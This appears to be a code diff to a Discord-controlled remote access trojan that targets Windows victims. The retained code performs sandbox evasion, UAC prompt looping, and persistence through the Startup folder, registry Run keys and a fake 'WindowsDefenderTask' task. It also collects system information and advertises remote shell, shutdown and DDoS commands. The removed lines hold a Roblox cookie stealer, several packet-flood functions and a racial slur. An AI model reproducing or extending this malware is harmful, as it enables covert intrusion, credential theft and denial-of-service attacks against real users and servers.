@@ -1,3 +1,5 @@
+# Imports of the RAT
+
 import asyncio
 import ctypes
 import cv2
@@ -28,7 +30,6 @@ import numpy as np
 import sounddevice as sd
 import win32crypt
 import shutil
-from scapy.all import IP, ICMP, send
 from pynput import keyboard
 from urllib3 import PoolManager
 from urllib.parse import urlparse
@@ -39,26 +40,31 @@ from discord.ext import commands
 from PIL import Image, ImageTk, ImageGrab
 from datetime import datetime, timedelta
 
-# VARS
+# Some Feature Option in the Feature. Useless rn!
 
 AutoSteal = False
 DiscordInjection = False
 AutoSelfDestroy = False
 
-# VARS
+# Better Looking Console for Debugging
 
 os.system("@echo off")
 os.system("cls")
 init()
 print(Fore.GREEN)
+# Fixxing an Error
 if sys.platform.startswith('win'):
     asyncio.set_event_loop_policy(asyncio.WindowsSelectorEventLoopPolicy())
 
+
+# Checks if an Token is given on Line 161 in the Code
 def check_token():
     if HzzH == "":
         print(f"{Fore.RED}[ERROR] No Token given on Line 161 in Code!{Fore.GREEN}")
         input()
 
+
+# Checks if the script is running on an Virtual Machine. 
 def perform_all_checks():
     blacklisted_names = ["johnson", "miller", "malware", "maltest", "currentuser", "sandbox", "virus", "john doe", "test user", "sand box", "wdagutilityaccount"]
     current_username = os.getenv("USERNAME", "").lower()
@@ -133,54 +139,28 @@ def perform_all_checks():
 
     return f"{Fore.BLUE}[INFO] No VM found!{Fore.GREEN}"
 
+# Performing the Check
 try:
     result = perform_all_checks()
 except:
     print(f"[ERROR] Error on VM Check")
-
+# Pritint the VM Check results
 print(result)
 
+# Intents for the Bot
 executor = ThreadPoolExecutor()
 intents = discord.Intents.default()
 intents.messages = True
 intents.guilds = True
 intents.message_content = True
 
-# This RAT is made by H-zz-H!  
-# If you have any questions or need help, feel free to contact me on Discord: _h_zz_h_ or join my server: https://discord.gg/29Ya4F3CgQ.  
-# On my Discord server (as of 23.02.2025), I have posted a cracked open-source Discord Stealer that would normally cost more than 120 euros for lifetime access.  
-# Join my Discord server for coding help or if you encounter errors with this RAT. I am always open to new ideas, projects, or feature suggestions for this RAT.  
-# If you want to add new features or improve this RAT, feel free to do so and share your work with me on Discord.  
-# If I find the time, this RAT will be updated and working forever. If not, well, I don't know.  
-# If you use this RAT for illegal purposes, I am not responsible for it. I am also not responsible for any damage caused by this RAT.  
-# Skid from this project if you want, I don’t really care lol. Just don’t claim it as your own work.  
 
-# Sources I skidded from:  
-# https://github.com/Blank-c/Blank-Grabber (The !blocklist and !unblocklist commands are almost fully skidded. I just changed the code a bit to fit my project).  
-# Tried doing it on my own (but I’m way too retarded for that).
-# https://github.com/moom825/Discord-RAT (Because of this RAT, I started this project. So special thanks to moom825).  
-# The !uncritproc and !critproc commands are from moom825's Discord-RAT project. Many features are quite the same as in moom825's project.  
-# That’s because I needed some features I could code, and his GitHub page was full of ideas to implement.  
-# Almost everything in this project is inspired by him.  
+# Bot token and command Prefix
+HzzH = ""
+bot = commands.Bot(command_prefix="!", intents=intents, help_command=None)
 
-# Thanks for taking the time to read.  
-# On line 146, change the Discord bot token to yours, and you’re good to go!  
-# Love y’all. Bye.  
-# ~~~ H-zz-H ~~~  
 
-HzzH = "" # Put ur bot token here
-bot = commands.Bot(command_prefix="!", intents=intents, help_command=None) # Change the "!" to whatever prefix you want
-
-# DO NOT CHANGE ANYTHING BELOW IF YOU DONT KNOW WHAT YOU ARE DOING
-
-# DO NOT CHANGE ANYTHING BELOW IF YOU DONT KNOW WHAT YOU ARE DOING
-
-# DO NOT CHANGE ANYTHING BELOW IF YOU DONT KNOW WHAT YOU ARE DOING
-
-# DO NOT CHANGE ANYTHING BELOW IF YOU DONT KNOW WHAT YOU ARE DOING
-
-# DO NOT CHANGE ANYTHING BELOW IF YOU DONT KNOW WHAT YOU ARE DOING
-
+# Paths and names for some commands
 apps_vdf = os.path.join(os.getenv("PROGRAMFILES(X86)"), "Steam", "config", "libraryfolders.vdf")
 acc_vdf = os.path.join(os.getenv("PROGRAMFILES(X86)"), "Steam", "config", "loginusers.vdf")
 steamurl = "https://api.steampowered.com/ISteamApps/GetAppList/v2"
@@ -201,26 +181,27 @@ LOCALAPPDATA = os.getenv("localappdata")
 REGEX = r"[\w-]{24,26}\.[\w-]{6}\.[\w-]{25,110}"
 REGEX_ENC = r"dQw4w9WgXcQ:[^.*\['(.*)'\].*$][^\"]*"
 current_directory = os.getcwd()
-methods = ['udp', 'pod', 'hzzh', 'minecraft']
 MIXER_OBJECTF_HMIXER = 0
 MIXER_CONTROL_CONTROLTYPE_VOLUME = 0x50000
 MIXERCONTROL_CONTROLTYPE_VOLUME = 0x50000
 MIXER_GETLINEINFOF_SOURCE = 0x00000001
 
+
+# Gets the System Information like:
 def get_system_info():
     try:
-        pc_name = platform.node()
-        ip_address = socket.gethostbyname(socket.gethostname())
-        system_version = platform.platform()
-        cpu_usage = psutil.cpu_percent(interval=1)
-        memory = psutil.virtual_memory().percent
-        disk = psutil.disk_usage('/')
+        pc_name = platform.node() # The PC Nane
+        ip_address = socket.gethostbyname(socket.gethostname()) # The PC's Ip Adress v6
+        system_version = platform.platform() # WIndows 10/11
+        cpu_usage = psutil.cpu_percent(interval=1) # CPU Usage
+        memory = psutil.virtual_memory().percent # Memory usage
+        disk = psutil.disk_usage('/') # DIsk space
         disk_free = round(disk.free / (1024 ** 3), 2)
         disk_total = round(disk.total / (1024 ** 3), 2)
         disk_used = round(disk.used / (1024 ** 3), 2)
-        ram = psutil.virtual_memory().used / (1024 ** 3) 
-        total_ram = psutil.virtual_memory().total / (1024 ** 3) 
-        geolocation_info = get_geolocation_info(ip_address)
+        ram = psutil.virtual_memory().used / (1024 ** 3) # Ram usage
+        total_ram = psutil.virtual_memory().total / (1024 ** 3) # Total ram
+        geolocation_info = get_geolocation_info(ip_address) # Geolocation of his IP
 
         return {
             "PC Name": pc_name,
@@ -236,6 +217,7 @@ def get_system_info():
     except Exception as e:
         return {"Error": str(e)}
 
+# Gets the geo location
 def get_geolocation_info(ip_address):
     try:
         response = requests.get("https://ipinfo.io/json")
@@ -247,6 +229,7 @@ def get_geolocation_info(ip_address):
     except:
         return "Unavailable"
 
+# Gets battery percentage if on laptop
 def get_battery_status():
     try:
         battery = psutil.sensors_battery()
@@ -257,6 +240,7 @@ def get_battery_status():
     except:
         return "Error retrieving battery info"
 
+# Get all tasks (programs) runnin
 def get_running_tasks():
     try:
         tasks = []
@@ -266,20 +250,21 @@ def get_running_tasks():
     except Exception as e:
         return [f"Error fetching tasks: {e}"]
 
+# CHanges wallpaper
 def change_wallpaper_windows(image_path):
     try:
         ctypes.windll.user32.SystemParametersInfoW(20, 0, image_path, 3)
     except Exception as e:
         ""
-
+# Checks for admin permissions
 def is_admin():
     return ctypes.windll.shell32.IsUserAnAdmin() != 0
-    
+# Asking for admin until its given
 def ask_for_admin():
     if is_admin():
         return True
     return False
-
+# Triggering UAC prompts until Admin permissions are given
 def trigger_uac():
     if not is_admin():
         exe_path = sys.argv[0]
@@ -302,18 +287,22 @@ def trigger_uac():
             return True
     else:
         return True
-    
+
+# Startup Options to stay on PC after restart
+# Copy itself to Startup
 def hzzh():
     try:
         if not os.path.exists(hzzh_path):
             shutil.copy(script_path, hzzh_path)
     except:
         pass
+# Copy itself to Temp
 def hzzhtemp():
     try:
         shutil.copy(script_path, hzzh_path1)
     except:
         pass
+# Copy itself to Registery
 def hzzhreg():
     try:
         registry_key = reg.OpenKey(reg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\Run", 0, reg.KEY_WRITE)
@@ -321,6 +310,7 @@ def hzzhreg():
         reg.CloseKey(registry_key)
     except Exception as e:
         pass
+# Copy itself to Registery 2
 def hzzh_runonce():
     try:
         registry_key = reg.OpenKey(reg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\RunOnce", 0, reg.KEY_WRITE)
@@ -328,6 +318,7 @@ def hzzh_runonce():
         reg.CloseKey(registry_key)
     except Exception as e:
         pass
+# Task Scheduler (this prob wont work)
 def hzzh_task_scheduler():
     try:
         task_name = "WindowsDefenderTask"
@@ -335,7 +326,7 @@ def hzzh_task_scheduler():
         subprocess.run(command, shell=True)
     except Exception as e:
         pass
-
+# Making an unclosable floating and moving picture (!floatpic)
 def prevent_close():
     pass
 
@@ -431,6 +422,8 @@ def create_window(duration, file_path):
     threading.Timer(duration, FLOATING_WINDOW.destroy).start()
     FLOATING_WINDOW.mainloop()
 
+
+# CHecking for wifi on start, so the script works running on startup
 def wait_for_wifi():
     while True:
         try:
@@ -441,6 +434,7 @@ def wait_for_wifi():
             print(Fore.BLUE + "[INFO] Waiting for Wi-Fi" + Fore.GREEN)
             time.sleep(5)
 
+# on startup checking in an channel for it already exists or creating one if not.
 @bot.event
 async def on_ready():
     guild = bot.guilds[0] 
@@ -998,94 +992,6 @@ def extract_steam_games():
 
     return games_data
 
-# https://github.com/Ramona-Flower/Roblox-Client-Cookie-Stealer/tree/main
-def retrieve_roblox_cookies():
-    user_profile = os.getenv("USERPROFILE", "")
-    roblox_cookies_path = os.path.join(user_profile, "AppData", "Local", "Roblox", "LocalStorage", "robloxcookies.dat")
-
-    if not os.path.exists(roblox_cookies_path):
-        return
-    
-    temp_dir = os.getenv("TEMP", "")
-    destination_path = os.path.join(temp_dir, "RobloxCookies.dat")
-    shutil.copy(roblox_cookies_path, destination_path)
-
-    with open(destination_path, 'r', encoding='utf-8') as file:
-        try:
-            file_content = json.load(file)
-            
-            encoded_cookies = file_content.get("CookiesData", "")
-            
-            if encoded_cookies:
-                decoded_cookies = base64.b64decode(encoded_cookies)
-            try:
-                decrypted_cookies = win32crypt.CryptUnprotectData(decoded_cookies, None, None, None, 0)[1]
-                decrypted_text = decrypted_cookies.decode('utf-8', errors='ignore')
-
-                with open("decrypted_cookies.txt", "w", encoding='utf-8') as f:
-                    f.write(decrypted_text)
-
-                return "decrypted_cookies.txt"
-            except Exception as e:
-                print(f"Error decrypting with DPAPI: {e}")
-                return None
-            else:
-                print("Error: No 'CookiesData' found in the file.")
-        
-        except json.JSONDecodeError as e:
-            print(f"Error while parsing JSON: {e}")
-        except Exception as e:
-            print(f"Error: {e}")
-            
-ddosexec = ThreadPoolExecutor(max_workers=3)
-def udp_flood(ip, duration):
-    port = 80
-    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-    packet = b'\x00' * 65507
-    end = time.time() + duration
-    while time.time() < end:
-        sock.sendto(packet, (ip, port))
-    sock.close()
-
-def minecraft_flood(ip, duration):
-    port = 25565
-    end = time.time() + duration
-    while time.time() < end:
-        try:
-            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-            sock.settimeout(0.3)
-            sock.connect((ip, port))
-            sock.send(b'\x00' * 65500)
-            sock.close()
-        except Exception:
-            pass
-
-def pod_flood(ip, duration):
-    duration = int(duration)
-    end_time = time.time() + duration
-    MESSAGE = b"T" * 60000
-
-    try:
-        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-        s.connect(("8.8.8.8", 80))
-        source_ip = s.getsockname()[0]
-        s.close()
-    except:
-        source_ip = "0.0.0.0"
-
-    packet = IP(src=source_ip, dst=ip) / ICMP() / MESSAGE
-
-    while time.time() < end_time:
-        send(packet, verbose=False)
-
-def hzzh_flood(ip, duration):
-    end = time.time() + duration
-    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-    packet = b'NIGGAHOLYNIGGAS' * 3000
-    while time.time() < end:
-        sock.sendto(packet, (ip, 80))
-    sock.close()
-
 @bot.command()
 async def help(ctx):
     embed = discord.Embed(
@@ -1112,13 +1018,13 @@ async def help(ctx):
     embed.add_field(name="!shell (command)", value="Executes the given Command (in powershell) 💻", inline=False)
     embed.add_field(name="!taskkill", value="Find programs with !tasks 🕳", inline=False)
     # embed.add_field(name="!running", value="On how many PC's is it running rn 🌍", inline=False)
-    embed.add_field(name="!botnet (ip) (time) <method>", value="Start a DDOS attack on a specific Server ⚡", inline=False)
+    embed.add_field(name="!botnet (url)", value="Start a DDOS attack on a specific Server ⚡", inline=False)
+    embed.add_field(name="!botnet_stop", value="Stops the DDOS attack ⚡", inline=False)
     embed.add_field(name="!error (Title) | (Text)", value="Displays a fake error Message ⚠️", inline=False)
     embed.add_field(name="!shutdown", value="Shutdowns Victims PC 🛑", inline=False)
     embed.add_field(name="!restart", value="Restarts Victims PC 🔄", inline=False)
     embed.add_field(name="!cd (path)", value="CD into another directory 🛠️", inline=False)
     embed.add_field(name="!list", value="Lists all files in current directory 📂", inline=False)
-    embed.add_field(name="!roblox", value="Steal roblox cookie 🎮🕹", inline=False)
     await ctx.send(embed=embed)
 
     embed1 = discord.Embed(
@@ -1195,70 +1101,6 @@ async def help(ctx):
     embed3.add_field(name="", value="Made with ❤ by H-zz-H.", inline=False)
 
     await ctx.send(embed=embed3)
-
-cmdusage = (
-    "**Usage:** `!botnet <ip> <time_in_seconds> <method>`\n\n"
-    "**Methods:**\n"
-    "- `udp` (port 80) — for normal websites (Recommended)\n"
-    "- `pod` (port 80) — Ping of Death (99% Outdated))\n"
-    "- `hzzh` (port 80) — selfmade method (Not really added rn)\n"
-    "- `minecraft` (port 25565) — Minecraft server (Should work for minecraft Servers!)\n")
-
-@bot.command()
-async def botnet(ctx, ip: str = None, time_sec: str = None, method: str = None):
-    if not ip or not time_sec or not method:
-        await ctx.send(f"❌ Missing arguments!\n\n{cmdusage}")
-        return
-
-    method = method.lower()
-    if method not in methods:
-        await ctx.send(f"❌ Invalid method `{method}`!\n\n{cmdusage}")
-        return
-
-    if not time_sec.isdigit() or int(time_sec) <= 0:
-        await ctx.send(f"❌ Time must be a positive number!\n\n{cmdusage}")
-        return
-
-    time_sec = int(time_sec)
-
-    embed = discord.Embed(
-        title="💥 Botnet Attack Started!",
-        description=f"Launching Method: **{method}** on `{ip}` for `{time_sec}` seconds...",
-        color=discord.Color.green()
-    )
-    await ctx.send(embed=embed)
-
-    loop = asyncio.get_event_loop()
-
-    if method == "udp":
-        await loop.run_in_executor(ddosexec, udp_flood, ip, time_sec)
-    elif method == "minecraft":
-        await loop.run_in_executor(ddosexec, minecraft_flood, ip, time_sec)
-    elif method == "pod":
-        await loop.run_in_executor(ddosexec, pod_flood, ip, time_sec)
-    elif method == "hzzh":
-        await loop.run_in_executor(ddosexec, hzzh_flood, ip, time_sec)
-
-@bot.command()
-async def roblox(ctx):
-    try:
-        file_path = retrieve_roblox_cookies()
-        
-        if file_path:
-            with open(file_path, "rb") as f:
-                await ctx.send(
-                    content="🦺 Roblox Cookies has been retrieved successfully.",
-                    file=discord.File(f, filename="decrypted_cookies.txt")
-                )
-        else:
-            raise Exception("Failed to decrypt or save cookies.")
-    except Exception as e:
-        embed = discord.Embed(
-            title="❌ Failed to retrieve Roblox cookies",
-            description=f"Error occurred: `{e}`",
-            color=discord.Color.red()
-        )
-        await ctx.send(embed=embed)
 
 @bot.command()
 async def minimize(ctx):
